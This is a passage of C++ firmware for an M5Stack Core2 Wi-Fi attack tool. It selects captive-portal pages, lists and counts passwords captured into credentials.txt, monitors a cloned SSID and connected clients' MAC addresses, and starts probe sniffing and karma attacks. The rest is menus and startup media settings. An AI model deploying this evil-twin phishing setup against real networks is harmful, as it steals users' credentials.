    server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  });

  serveChangePasswordPage();
}



void changePortal() {
  listPortalFiles();
  const int listDisplayLimit = M5.Display.height() / 18;
  bool needDisplayUpdate = true;

  while (!inMenu) {
    if (needDisplayUpdate) {
      int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));

      M5.Display.clear();
      M5.Display.setTextSize(2);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.setCursor(10, 10);

      for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
        if (i == portalFileIndex) {
          M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
          M5.Display.setTextColor(TFT_GREEN);
        } else {
          M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(10, (i - listStartIndex) * 18);
        M5.Display.println(portalFiles[i].substring(7));
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }

    M5.update();
    if (M5.BtnA.wasPressed()) {
      portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
      needDisplayUpdate = true;
    } else if (M5.BtnC.wasPressed()) {
      portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
      needDisplayUpdate = true;
    } else if (M5.BtnB.wasPressed()) {
      selectedPortalFile = portalFiles[portalFileIndex];
      inMenu = true;
      Serial.println("-------------------");
      Serial.println(selectedPortalFile.substring(7) + " portal selected.");
      Serial.println("-------------------");
      Serial.println("-------------------");
      Serial.println(selectedPortalFile.substring(7) + " portal selected.");
      Serial.println("-------------------");
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));
        pixels.setPixelColor(9, pixels.Color(255, 0, 0));
        pixels.show();
        delay(50);

        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.setPixelColor(9, pixels.Color(0, 0, 0));
        pixels.show();
      }
      waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
    }
  }
}



String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0;

void readCredentialsFromFile() {
  File file = SD.open("/credentials.txt");
  if (file) {
    numCredentials = 0;
    while (file.available() && numCredentials < 100) {
      credentialsList[numCredentials++] = file.readStringUntil('\n');
    }
    file.close();
  } else {
    Serial.println("Error opening file");
  }
}

void checkCredentials() {
  readCredentialsFromFile(); // Assume this populates a global array or vector with credentials

  // Initial display setup
  int currentListIndex = 0;
  bool needDisplayUpdate = true;

  while (true) {
    if (needDisplayUpdate) {
      displayCredentials(currentListIndex); // Function to display credentials on the screen
      needDisplayUpdate = false;
    }

    M5.update();
    handleDnsRequestSerial(); // Handle any background tasks

    // Navigation logic
    if (M5.BtnA.wasPressed()) {
      currentListIndex = max(0, currentListIndex - 1);
      needDisplayUpdate = true;
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex = min(numCredentials - 1, currentListIndex + 1);
      needDisplayUpdate = true;
    } else if (M5.BtnB.wasPressed()) {
      // Exit or perform an action with the selected credential
      break; // Exit the loop to return to the menu or do something with the selected credential
    }
  }

  // Return to menu or next operation
  inMenu = true; // Assuming this flag controls whether you're in the main menu
  drawMenu(); // Redraw the main menu
}

void displayCredentials(int index) {
  // Clear the display and set up text properties
  M5.Display.clear();
  M5.Display.setTextSize(2);

  int maxVisibleLines = M5.Display.height() / 18; // Nombre maximum de lignes affichables à l'écran
  int currentLine = 0; // Ligne actuelle en cours de traitement
  int firstLineIndex = index; // Index de la première ligne de l'entrée sélectionnée
  int linesBeforeIndex = 0; // Nombre de lignes avant l'index sélectionné

  // Calculer combien de lignes sont nécessaires avant l'index sélectionné
  for (int i = 0; i < index; i++) {
    int neededLines = 1 + M5.Display.textWidth(credentialsList[i]) / (M5.Display.width() - 20);
    linesBeforeIndex += neededLines;
  }

  // Ajuster l'index de la première ligne si nécessaire pour s'assurer que l'entrée sélectionnée est visible
  while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
    linesBeforeIndex--;
    firstLineIndex--;
  }

  // Afficher les entrées de credentials visibles
  for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
    String credential = credentialsList[i];
    int neededLines = 1 + M5.Display.textWidth(credential) / (M5.Display.width() - 20);

    if (i == index) {
      M5.Display.fillRect(0, currentLine * 18, M5.Display.width(), 18 * neededLines, TFT_NAVY);
    }

    for (int line = 0; line < neededLines; line++) {
      M5.Display.setCursor(10, (currentLine + line) * 18);
      M5.Display.setTextColor(i == index ? TFT_GREEN : TFT_WHITE);

      int startChar = line * (credential.length() / neededLines);
      int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
      M5.Display.println(credential.substring(startChar, endChar));
    }

    currentLine += neededLines;
  }

  M5.Display.display();
}





bool confirmPopup(String message) {
  bool confirm = false;
  bool decisionMade = false;

  M5.Display.clear();
  M5.Display.setCursor(50, M5.Display.height() / 2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println(message);
  M5.Display.setCursor(37, 220);
  M5.Display.setTextColor(TFT_GREEN);
  M5.Display.println("Yes");
  M5.Display.setTextColor(TFT_RED);
  M5.Display.setCursor(254, 220);
  M5.Display.println("No");
  M5.Display.setTextColor(TFT_WHITE);

  while (!decisionMade) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      confirm = true;
      decisionMade = true;
    }
    if (M5.BtnC.wasPressed()) {
      confirm = false;
      decisionMade = true;
    }
  }

  return confirm;
}

void deleteCredentials() {
  if (confirmPopup("Delete credentials?")) {
    File file = SD.open("/credentials.txt", FILE_WRITE);
    if (file) {
      file.close();
      Serial.println("-------------------");
      Serial.println("credentials.txt deleted");
      Serial.println("-------------------");
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("Credentials deleted successfully");
    } else {
      Serial.println("-------------------");
      Serial.println("Error deleteting credentials.txt ");
      Serial.println("-------------------");
      waitAndReturnToMenu("Error..");
      Serial.println("Error opening file for deletion");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}


int countPasswordsInFile() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password --")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}


int oldNumClients = -1;
int oldNumPasswords = -1;
String isBluetoothEnabled;

void displayMonitorPage1() {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);

  M5.Display.setCursor(10, 90);
  M5.Display.println("SSID: " + clonedSSID);
  M5.Display.setCursor(10, 120);
  M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
  M5.Display.setCursor(10, 150);
  M5.Display.println("Page: " + selectedPortalFile.substring(7));

  if (bluetoothEnabled) {
    isBluetoothEnabled = "ON";
  } else {
    isBluetoothEnabled = "OFF";
  }
  M5.Display.setCursor(10, 180);
  M5.Display.println("Bluetooth: " + isBluetoothEnabled);

  oldNumClients = -1;
  oldNumPasswords = -1;

  M5.Display.display();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();
    server.handleClient();

    int newNumClients = WiFi.softAPgetStationNum();
    int newNumPasswords = countPasswordsInFile();

    if (newNumClients != oldNumClients) {
      M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
      M5.Display.setCursor(10, 30);
      M5.Display.println("Clients: " + String(newNumClients));
      oldNumClients = newNumClients;
    }

    if (newNumPasswords != oldNumPasswords) {
      M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
      M5.Display.setCursor(10, 60);
      M5.Display.println("Passwords: " + String(newNumPasswords));
      oldNumPasswords = newNumPasswords;
    }

    if (M5.BtnA.wasPressed()) {
      displayMonitorPage3();
      break;
    } else if (M5.BtnC.wasPressed()) {
      displayMonitorPage2();
      break;
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      drawMenu();
      break;
    }

    delay(100);
  }
}

void updateConnectedMACs() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  for (int i = 0; i < adapterList.num; i++) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
             adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
    macAddresses[i] = String(macStr);
  }
}

void displayMonitorPage2() {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  updateConnectedMACs();
  if (macAddresses[0] == "") {
    M5.Display.setCursor(10, 30);
    M5.Display.println("No client connected");
    Serial.println("----Mac-Address----");
    Serial.println("No client connected");
    Serial.println("-------------------");
  } else {
    Serial.println("----Mac-Address----");
    for (int i = 0; i < 10; i++) {
      int y = 30 + i * 20;
      if (y > M5.Display.height() - 20) break;

      M5.Display.setCursor(10, y);
      M5.Display.println(macAddresses[i]);
      Serial.println(macAddresses[i]);
    }
    Serial.println("-------------------");
  }


  M5.Display.display();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();
    if (M5.BtnA.wasPressed()) {
      displayMonitorPage1();
      break;
    } else if (M5.BtnC.wasPressed()) {
      displayMonitorPage3();
      break;
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      drawMenu();
      break;
    }
  }
}

String oldStack = "";
String oldRamUsage = "";
String oldBatteryLevel = "";
String oldTemperature = "";

String getBatteryLevel() {
  return String(M5.Power.getBatteryLevel());
}

String getTemperature() {
  float temperature;
  M5.Imu.getTemp(&temperature);
  int roundedTemperature = round(temperature);
  return String(roundedTemperature);
}

String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}

String getRamUsage() {
  float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0;
  char buffer[10];
  sprintf(buffer, "%.2f", heapSizeInMegabytes);
  return String(buffer);
}

unsigned long lastUpdateTime = 0;
const long updateInterval = 1000;

void displayMonitorPage3() {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);


  oldStack = getStack();
  oldRamUsage = getRamUsage();
  oldBatteryLevel = getBatteryLevel();
  oldTemperature = getTemperature();

  M5.Display.setCursor(10, 30);
  M5.Display.println("Stack left: " + oldStack + " Kb");
  M5.Display.setCursor(10, 60);
  M5.Display.println("RAM: " + oldRamUsage + " Mo");
  M5.Display.setCursor(10, 90);
  M5.Display.println("Battery: " + oldBatteryLevel + "%"); // thx to kdv88 to pointing mistranlastion
  M5.Display.setCursor(10, 120);
  M5.Display.println("Temperature: " + oldTemperature + "C");

  // Display initial date and time
  auto dt = M5.Rtc.getDateTime();  // Get RTC date and time
  M5.Display.setCursor(10, 150);
  M5.Display.printf("Date: %04d-%02d-%02d", dt.date.year, dt.date.month, dt.date.date);
  M5.Display.setCursor(10, 180);
  M5.Display.printf("Time: %02d:%02d:%02d", dt.time.hours, dt.time.minutes, dt.time.seconds);

  M5.Display.display();

  lastUpdateTime = millis();


  oldStack = "";
  oldRamUsage = "";
  oldBatteryLevel = "";
  oldTemperature = "";

  M5.Display.display();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();

    unsigned long currentMillis = millis();


    if (currentMillis - lastUpdateTime >= updateInterval) {
      String newStack = getStack();
      String newRamUsage = getRamUsage();
      String newBatteryLevel = getBatteryLevel();
      String newTemperature = getTemperature();

      if (newStack != oldStack) {
        M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 30);
        M5.Display.println("Stack left: " + newStack + " Kb");
        oldStack = newStack;
      }

      if (newRamUsage != oldRamUsage) {
        M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 60);
        M5.Display.println("RAM: " + newRamUsage + " Mo");
        oldRamUsage = newRamUsage;
      }

      if (newBatteryLevel != oldBatteryLevel) {
        M5.Display.fillRect(10, 90, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 90);
        M5.Display.println("Battery: " + newBatteryLevel + "%");// thx to kdv88 to pointing mistranlastion
        oldBatteryLevel = newBatteryLevel;
      }

      if (newTemperature != oldTemperature) {
        M5.Display.fillRect(10, 120, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 120);
        M5.Display.println("Temperature: " + newTemperature + "C");
        oldTemperature = newTemperature;
      }

            // Update date and time
      dt = M5.Rtc.getDateTime();
      M5.Display.fillRect(10, 150, 300, 20, TFT_BLACK);
      M5.Display.setCursor(10, 150);
      M5.Display.printf("Date: %04d-%02d-%02d", dt.date.year, dt.date.month, dt.date.date);
      M5.Display.fillRect(10, 180, 300, 20, TFT_BLACK);
      M5.Display.setCursor(10, 180);
      M5.Display.printf("Time: %02d:%02d:%02d", dt.time.hours, dt.time.minutes, dt.time.seconds);

      lastUpdateTime = currentMillis;
    }

    if (M5.BtnA.wasPressed()) {
      displayMonitorPage2();
      break;
    } else if (M5.BtnC.wasPressed()) {
      displayMonitorPage1();
      break;
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      drawMenu();
      break;
    }

    delay(100);
  }
}



void probeSniffing() {
  isProbeSniffingMode = true;
  isProbeSniffingRunning = true;
  startScanKarma();

  while (isProbeSniffingRunning) {
    M5.update();
    handleDnsRequestSerial();

    if (M5.BtnB.wasPressed()) {
      stopProbeSniffingViaSerial = false;
      isProbeSniffingRunning = false;
      break;
    }
  }

  stopScanKarma();
  isProbeSniffingMode = false;
  if (stopProbeSniffingViaSerial) {
    stopProbeSniffingViaSerial = false;
  }
}



void karmaAttack() {
  drawStartButtonKarma();
}

void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(50 , M5.Display.height() / 2 );
  M5.Display.println(message);
  M5.Display.display();
  delay(1500);
  inMenu = true;
  drawMenu();
}



void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options, bool loop, bool displayTitle, const String &title = "") {
  int currentIndex = 0;
  bool selectionMade = false;
  const int lineHeight = 16;
  const int maxVisibleLines = 11;
  int menuStartIndex = 0;

  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextFont(1);
  enterDebounce();

  for (int i = 0; i < maxVisibleLines; ++i) {
    int optionIndex = menuStartIndex + i;
    if (optionIndex >= options.size()) break;

    if (optionIndex == currentIndex) {
      M5.Display.fillRect(0, 0 + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
      M5.Display.setTextColor(menuTextFocusedColor);
    } else {
      M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    }
    M5.Display.setCursor(0, 0 + i * lineHeight);
    M5.Display.println(options[optionIndex].first);
  }
  M5.Display.display();

  while (!selectionMade) {
    M5.update();


    bool screenNeedsUpdate = false;

    if (M5.BtnA.wasPressed()) {
      currentIndex = (currentIndex - 1 + options.size()) % options.size();
      menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
      screenNeedsUpdate = true;
      delay(150); // anti-rebond
    } else if (M5.BtnC.wasPressed()) {
      currentIndex = (currentIndex + 1) % options.size();
      menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
      screenNeedsUpdate = true;
      delay(150); // anti-rebond
    } else if (M5.BtnB.wasPressed()) {
      options[currentIndex].second();
      if (!loop) {
        selectionMade = true;
      }
    } else if (M5.BtnB.wasPressed()) {
      selectionMade = true;
      delay(150); // anti-rebond
      waitAndReturnToMenu("Back to menu");
    }

    if (screenNeedsUpdate) {
      M5.Display.clear();

      for (int i = 0; i < maxVisibleLines; ++i) {
        int optionIndex = menuStartIndex + i;
        if (optionIndex >= options.size()) break;

        if (optionIndex == currentIndex) {
          M5.Display.fillRect(0, 0 + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(0, 0 + i * lineHeight);
        M5.Display.println(options[optionIndex].first);
      }

      M5.Display.display();
    }

    delay(100);
  }
}

void showSettingsMenu() {
  std::vector<std::pair<String, std::function<void()>>> options;

  bool continueSettingsMenu = true;

  while (continueSettingsMenu) {
    options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement

    options.push_back({"Brightness", brightness});
    options.push_back({soundOn ? "Sound Off" : "Sound On", []() {toggleSound();}});
    options.push_back({ledOn ? "LED Off" : "LED On", []() {toggleLED();}});
    options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}});
    options.push_back({"Set Startup Image", setStartupImage});
    options.push_back({"Set Startup Volume", adjustVolume});
    options.push_back({"Set Startup Sound", setStartupSound});
    options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {toggleRandom();}});
    options.push_back({"Update DateTime", []() {updateDateTimeFromSD();}});
    loopOptions(options, false, true, "Settings");

    // Vérifie si BACKSPACE a été pressé pour quitter le menu
    if (M5.BtnB.wasPressed()) {
      continueSettingsMenu = false;
    }
  }
  inMenu = true;
}

void setGPSBaudrate() {
  // Liste des baudrates disponibles
  std::vector<int> baudrates = {9600, 19200, 115200};
  int currentBaudrateIndex = 0;
  bool baudrateSelected = false;

  const int maxDisplayItems = 3; // Tous les items peuvent être affichés simultanément
  bool needDisplayUpdate = true;

  enterDebounce();
  while (!baudrateSelected) {
    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setCursor(0, 0);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("Select GPS Baudrate:");

      for (int i = 0; i < baudrates.size(); i++) {
        if (i == currentBaudrateIndex) {
          M5.Display.setTextColor(menuTextFocusedColor); // Highlight selected item
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Normal text color
        }
        M5.Display.println(String(baudrates[i]));
      }

      needDisplayUpdate = false; // Reset the display update flag
    }

    M5.update();


    // Navigation vers le haut
    if (M5.BtnA.wasPressed()) {
      currentBaudrateIndex = (currentBaudrateIndex - 1 + baudrates.size()) % baudrates.size();
      needDisplayUpdate = true;
    }
    // Navigation vers le bas
    else if (M5.BtnC.wasPressed()) {
      currentBaudrateIndex = (currentBaudrateIndex + 1) % baudrates.size();
      needDisplayUpdate = true;
    }
    // Sélectionner le baudrate
    else if (M5.BtnB.wasPressed()) {
      baudrate_gps = baudrates[currentBaudrateIndex];
      saveGPSBaudrateConfig(baudrate_gps);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.fillScreen(menuBackgroundColor);
      M5.Display.setCursor(0, M5.Display.height() / 2);
      M5.Display.print("GPS Baudrate set to\n" + String(baudrate_gps));
      Serial2.end();
      Serial2.begin(baudrate_gps, SERIAL_8N1, 1, -1);
      delay(1000);
      baudrateSelected = true;
    }
    // Quitter sans sélectionner
    else if (M5.BtnB.wasPressed()) {
      baudrateSelected = true;
    }

    delay(150);  // Anti-bounce delay for key presses
  }
}

void saveGPSBaudrateConfig(int baudrate) {
  // Lire le contenu du fichier de configuration
  File file = SD.open(configFilePath, FILE_READ);
  String content = "";
  bool found = false;

  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("baudrate_gps=")) {
        // Remplacer la ligne existante par la nouvelle valeur
        content += "baudrate_gps=" + String(baudrate) + "\n";
        found = true;
      } else {
        // Conserver les autres lignes
        content += line + "\n";
      }
    }
    file.close();
  }

  // Si la clé n'a pas été trouvée, l'ajouter à la fin
  if (!found) {
    content += "baudrate_gps=" + String(baudrate) + "\n";
  }

  // Réécrire tout le fichier de configuration
  file = SD.open(configFilePath, FILE_WRITE);
  if (file) {
    file.print(content);
    file.close();
  }
}



void saveStartupSoundConfig(const String& paramValue) {
  // Lire le contenu du fichier de configuration
  File file = SD.open(configFilePath, FILE_READ);
  String content = "";
  bool found = false;

  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("startupSound=")) {
        // Remplacer la ligne existante par la nouvelle valeur
        content += "startupSound=/audio/" + paramValue + "\n";
        found = true;
      } else {
        // Conserver les autres lignes
        content += line + "\n";
      }
    }
    file.close();
  }

  // Si la clé n'a pas été trouvée, l'ajouter à la fin
  if (!found) {
    content += "startupSound=/audio/" + paramValue + "\n";
  }

  // Réécrire tout le fichier de configuration
  file = SD.open(configFilePath, FILE_WRITE);
  if (file) {
    file.print(content);
    file.close();
  }
}

void loadStartupSoundConfig() {
  File file = SD.open(configFilePath, FILE_READ);
  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("startupSound")) {
        selectedStartupSound = line.substring(line.indexOf('=') + 1);
        break;
      }
    }
    file.close();
  }
}
void setStartupSound() {
  File root = SD.open("/audio");
  std::vector<String> sounds;

  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      if (fileName.endsWith(".mp3")) {
        sounds.push_back(fileName);
      }
    }
    file.close();
  }
  root.close();

  if (sounds.size() == 0) {
    M5.Display.clear();
    M5.Display.println("No sounds found");
    delay(2000);
    return;
  }

  int currentSoundIndex = 0;
  bool soundSelected = false;
  const int maxDisplayItems = 10;  // Nombre maximum d'éléments à afficher en même temps
  const int maxFileNameLength = 26;  // Limite de caractères pour le nom du fichier
  int menuStartIndex = 0;
  bool needDisplayUpdate = true;

  enterDebounce();
  while (!soundSelected) {
    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setCursor(0, 0);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("Select Startup Sound:");

      for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < sounds.size(); i++) {
        int itemIndex = menuStartIndex + i;
        String displayFileName = sounds[itemIndex];

        // Truncate the file name if it's too long
        if (displayFileName.length() > maxFileNameLength) {
          displayFileName = displayFileName.substring(0, maxFileNameLength);
        }

        if (itemIndex == currentSoundIndex) {
          M5.Display.setTextColor(menuTextFocusedColor); // Highlight selected item
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Normal text color
        }
        M5.Display.println(displayFileName);
      }

      needDisplayUpdate = false; // Reset the display update flag
    }

    M5.update();


    if (M5.BtnA.wasPressed()) {
      currentSoundIndex = (currentSoundIndex - 1 + sounds.size()) % sounds.size();
      if (currentSoundIndex < menuStartIndex) {
        menuStartIndex = currentSoundIndex;
      } else if (currentSoundIndex >= menuStartIndex + maxDisplayItems) {
        menuStartIndex = currentSoundIndex - maxDisplayItems + 1;
      }
      needDisplayUpdate = true; // Mark for display update
    } else if (M5.BtnC.wasPressed()) {
      currentSoundIndex = (currentSoundIndex + 1) % sounds.size();
      if (currentSoundIndex >= menuStartIndex + maxDisplayItems) {
        menuStartIndex = currentSoundIndex - maxDisplayItems + 1;
      } else if (currentSoundIndex < menuStartIndex) {
        menuStartIndex = currentSoundIndex;
      }
      needDisplayUpdate = true; // Mark for display update
    } else if (M5.BtnB.wasPressed()) {
      selectedStartupSound = sounds[currentSoundIndex];
      saveStartupSoundConfig(selectedStartupSound);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.fillScreen(menuBackgroundColor);
      M5.Display.setCursor(0, M5.Display.height() / 2);
      M5.Display.print("Startup sound set to\n" + selectedStartupSound);
      delay(1000);
      soundSelected = true;
    } else if (M5.BtnB.wasPressed()) {
      soundSelected = true;
    } else if (M5.BtnPWR.wasClicked()) {
      String soundPath = "/audio/" + sounds[currentSoundIndex];
      play(soundPath.c_str());
      while (mp3.isRunning()) {
        if (!mp3.loop()) {
          mp3.stop();
        }
        delay(1);
      }
    }

    delay(150);  // Anti-bounce delay for key presses
  }
}

void saveStartupImageConfig(const String& paramValue) {
  // Lire le contenu du fichier de configuration
  File file = SD.open(configFilePath, FILE_READ);
  String content = "";
  bool found = false;

  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("startupImage=")) {
        // Remplacer la ligne existante par la nouvelle valeur
        content += "startupImage=/img/" + paramValue + "\n";
        found = true;
      } else {
        // Conserver les autres lignes
        content += line + "\n";
      }
    }
    file.close();
  }

  // Si la clé n'a pas été trouvée, l'ajouter à la fin
  if (!found) {
    content += "startupImage=/img/" + paramValue + "\n";
  }

  // Réécrire tout le fichier de configuration
  file = SD.open(configFilePath, FILE_WRITE);
  if (file) {
    file.print(content);
    file.close();
  }
}


void loadStartupImageConfig() {
  File file = SD.open(configFilePath, FILE_READ);
  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("startupImage")) {
        selectedStartupImage = line.substring(line.indexOf('=') + 1);
        break;
      }
    }
    file.close();
  }
}

void toggleRandom() {
  randomOn = !randomOn;
  saveConfigParameter("randomOn", randomOn);  // Sauvegarder dans le fichier config
}


std::vector<String> imageFiles = {
  "HiVenoumous.jpg", "infernoDemon.jpg", "InThePocket.jpg", "KNAX-EVILBAT.jpg",
  "neoEvilProject.jpg", "parkour.jpg", "R&MImIn.jpg",
  "R&MPortal.jpg", "R&MSpace.jpg", "startup-M5Core2-2.jpg",
  "startup-M5Core2.jpg", "superDemonHacker.jpg", "WhySoSerious.jpg",
  "WifiDemon.jpg", "wifiHackingInTown.jpg", "afewmomentlater.jpg", "Evil_WiFi.jpg",
  "hackers-group.jpg", "hackers-watchingU.jpg", "HackThePlanet.jpg", "HackThePlanet2.jpg",
  "Hell's_Evil_Core.jpg", "pedro.jpg", "AlienWifiMaster.jpg", "beach.jpg",
  "BigLivingM5Core2.jpg", "CuteEvil.jpg", "cutevilprojects.jpg", "DAKKA-EVILBILLBOARD.jpg",
  "DAKKA-EVILBILLBOARD2.jpg", "DAKKA-M5billboard.jpg", "DejaVu.jpg", "DemonHacker.jpg",
  "EP2.jpg", "Evil-clown.jpg", "Evil-DeathHacker.jpg", "EvilBiohazard.jpg",
  "EvilCoreDemon.jpg", "EvilHacking.jpg", "EvilInDark.jpg", "EvilM5hub.jpg",
  "EvilMoto.jpg", "EvilProject-zombie.jpg", "EvilRickRoll.jpg", "HamsterSound.jpg",
  "WiFi_Demon.jpg", "youshouldnotpass.jpg", "DAKKA-graph.jpg", "DAKKA-graph2.jpg",
  "DiedDysentry.jpg", "EternalBlue.jpg", "IHateMonday.jpg", "WinBSOD.jpg",
  "WinXp.jpg", "WinXp2.jpg", "DAKKA-EvilSkate.jpg", "DAKKA-EvilwithPhone.jpg" , "southpark.jpg", "southpark-2.jpg" , "southpark-all-town.jpg"
};

std::vector<String> soundFiles = {
  "Thejocker-magictricks.mp3", "Deja-Vu.mp3", "car.mp3", "Fatality.mp3",
  "DAKKA-EVILBASSCANNON.mp3", "electroswing.mp3", "evilmp3test.mp3", "DAKKA-EVILTEETH.mp3",
  "ok.mp3", "DAKKA-EvilModem.mp3", "AWA.mp3", "uwu.mp3",
  "fbi-open-up!.mp3", "I'M GONNA KILL YOU.mp3", "HamsterSound.mp3", "BITE MY SHINY METAL ASS.mp3",
  "DAKKA-EVILVIRUS.mp3", "EvilHub.mp3", "GTA-wasted.mp3", "Hi-Venomous.mp3",
  "I'M HOLDING A BOX OF TIC.mp3", "R&MImIn.mp3", "r2d2.mp3", "RickRoll.mp3",
  "sample.mp3", "pickle_rick.mp3", "portal-gun-sound-effect.mp3", "show_me_what_you_got.mp3",
  "you-will-respect-my-authoritah.mp3", "BRUH.mp3", "disqualified.mp3", "Mr-meeseeks.mp3",
  "gandalf_shallnotpass.mp3", "hacktheplanet.mp3", "I'M HOLDING A BOX OF TIC TACS.mp3", "Q3a_quad_damage.mp3",
  "kill-bill.mp3", "back-to-the-future.mp3", "a-few-moments-later-hd.mp3", "new element rick.mp3",
  "pedro.mp3", "thats-what-she-said.mp3", "doh.mp3", "fifth-element-aziz-light.mp3",
  "1-21GW.mp3", "DAKKA-EVILHEAT.mp3", "DAKKA-NewElement_rick.mp3", "you-will-respect-my-authoritah_1.mp3",
  "psx.mp3", "takemymoney.mp3", "windows-xp-startup.mp3", "leeloo-dallas-multipass.mp3",
  "wow-quest-complete.mp3", "skyrim_fus-ro-dah.mp3", "skyrim_level_up.mp3", "nani.mp3",
  "among-us.mp3", "leroy-jenkins.mp3"
};


String getRandomImage() {
  if (imageFiles.size() == 0) {
    return "/img/startup-M5Core2.jpg";  // Image par défaut si la liste est vide
  }
  int randomIndex = random(0, imageFiles.size());  // Choisir un index aléatoire
  return "/img/" + imageFiles[randomIndex];  // Retourner le chemin complet de l'image
}

String getRandomSound() {
  if (soundFiles.size() == 0) {
    return "/audio/sample.mp3";  // Son par défaut si la liste est vide
  }
  int randomIndex = random(0, soundFiles.size());  // Choisir un index aléatoire
  return "/audio/" + soundFiles[randomIndex];  // Retourner le chemin complet du son
}



bool imageMode = false; // Variable pour savoir si on est en mode image

void setStartupImage() {
  File root = SD.open("/img");
  std::vector<String> images;

  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      if (fileName.endsWith(".jpg")) {
        images.push_back(fileName);
      }
    }
    file.close();
  }
  root.close();

  if (images.size() == 0) {
    M5.Display.clear();
    M5.Display.println("No images found");
    delay(2000);
    return;
  }

  int currentImageIndex = 0;
  bool imageSelected = false;
  const int maxDisplayItems = 10;  // Nombre maximum d'éléments à afficher
  int menuStartIndex = 0;
  bool needDisplayUpdate = true;
  bool imageMode = false;  // Variable pour savoir si on est en mode image directe

